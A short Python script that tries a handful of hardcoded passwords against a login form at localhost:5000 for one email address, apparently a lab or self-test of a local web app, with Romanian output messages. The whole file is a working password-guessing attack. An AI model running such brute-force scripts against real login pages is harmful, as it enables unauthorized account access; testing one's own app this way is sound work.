import requests

TARGET = "http://localhost:5000/login"
EMAIL  = "test@test.com"
PASSWORDS = ["abc", "1234", "password", "parola123", "test123"]

for pwd in PASSWORDS:
    r = requests.post(TARGET, data={"email": EMAIL, "password": pwd})
    if "Dashboard" in r.text or "redirect" in r.url:
        print(f"[FOUND] Parola este: {pwd}")
        break
    else:
        print(f"[FAIL] {pwd}")
